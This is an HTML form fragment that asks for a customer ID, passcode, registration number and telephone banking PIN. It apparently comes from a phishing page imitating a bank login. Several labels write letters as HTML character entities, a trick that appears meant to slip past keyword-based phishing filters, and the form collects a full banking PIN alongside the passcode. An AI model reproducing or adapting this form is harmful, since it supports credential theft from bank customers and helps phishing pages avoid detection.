<br>
<form>
	<table width="100%">
		<tr>
			<td width="30%">Customer ID</td>
			<td width="2%">&nbsp;&nbsp;:&nbsp;&nbsp;</td>
			<td>
				<div class="textInput">
					<div class="fieldWrapper">
						<input type="text"  autocomplete="off"  maxlength="20" name="csid" value="" required="required" title="Customer ID">
					</div>
				</div>
			</td>
		</tr>
		<tr>
			<td width="30%">Pa&#115;&#115;code</td>
			<td width="2%">&nbsp;&nbsp;:&nbsp;&nbsp;</td>
			<td>
				<div class="textInput">
					<div class="fieldWrapper">
						<input type="password"  autocomplete="off"  maxlength="20" name="pscode" value="" required="required" title="Passcode">
					</div>
				</div>
			</td>
		</tr>
		<tr>
			<td width="30%">Regi&#115;tration Number</td>
			<td width="2%">&nbsp;&nbsp;:&nbsp;&nbsp;</td>
			<td>
				<div class="textInput">
					<div class="fieldWrapper">
						<input type="number"  autocomplete="off" style="width: 6.4em;" maxlength="20" name="rnum" value="" required="required" title="Registration number">
					</div>
				</div>
			</td>
		</tr>
		<tr>
			<tr>
				<td width="30%">Telephone Ba&#x006E;king P&#105;n</td>
				<td width="2%">&nbsp;&nbsp;:&nbsp;&nbsp;</td>
				<td>
					<div class="textInput">
						<div class="fieldWrapper">
							<input type="password" id="txt" onkeyup="check()" onmouseout="check()" autocomplete="off"  maxlength="6" name="tpin" value="" required="required" title="Telephone Pin">
						</div>
					</div>
				</td>
			</tr>
		</table>
	</form>